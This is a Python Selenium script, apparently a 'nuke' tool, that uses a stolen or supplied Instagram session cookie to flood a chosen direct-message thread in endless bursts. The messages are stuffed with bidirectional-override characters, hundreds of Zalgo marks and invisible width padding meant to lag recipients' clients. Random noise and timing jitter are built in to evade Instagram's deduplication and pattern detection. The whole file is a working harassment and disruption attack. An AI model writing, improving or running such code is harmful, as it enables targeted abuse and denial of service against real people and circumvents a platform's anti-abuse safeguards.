# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (STEALTH-OBLITERATOR)
# 📅 STATUS: ANTI-FILTERING | DENSITY x20 | UNIQUE NOISE

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 240 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_stealth_payload(target_name):
    """Bypasses silent filters by adding unique noise and unique headers."""
    # 💥 UNIQUE NOISE (Prevents server-side deduplication)
    noise_id = "".join(random.choices("0123456789ABCDEF", k=10))
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 SESSION_REF: {noise_id}\n"
    
    # 💥 BiDi-RECURSION + VARIATION SELECTORS
    # Using \ufe0f forces the browser to try and render color glyphs.
    bidi_stack = "\u202E\u2066\u202D\u2067\u202B\u2068\ufe0f" * 8
    
    # 💥 DENSITY x20 (200 Zalgo marks)
    z_tower = "̸" * 200
    
    # 💥 WIDTH DISPLACER (Hidden Braille)
    width_bomb = "\u2800\u00A0" * 110 
    
    lines = [header, width_bomb]
    
    for i in range(60):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        # Combine everything into an unbreakable block
        lines.append(f"{prefix}{target_name.upper()}{z_tower}{bidi_stack}")
    
    return "\n".join(lines)[:9950]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ STEALTH MODE ACTIVE...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(8)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    # 🔥 THE 'JITTER' BURST (Bypasses Pattern Detection)
                    for _ in range(8):
                        payload = get_stealth_payload(target_name)
                        driver.execute_script("""
                            var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
                            if (box) {
                                box.focus();
                                document.execCommand('insertText', false, arguments[0]);
                                box.dispatchEvent(new Event('input', { bubbles: true }));
                                var btns = document.querySelectorAll('div[role="button"]');
                                for(var b of btns) {
                                    if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
                                        b.click();
                                    }
                                }
                            }
                        """, payload)
                        # Slightly slower delay (0.1s) is actually MORE effective for lag 
                        # because it doesn't get dropped by the socket.
                        time.sleep(random.uniform(0.1, 0.3)) 
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 WAVE LANDED", flush=True)
                    time.sleep(random.uniform(5, 7)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
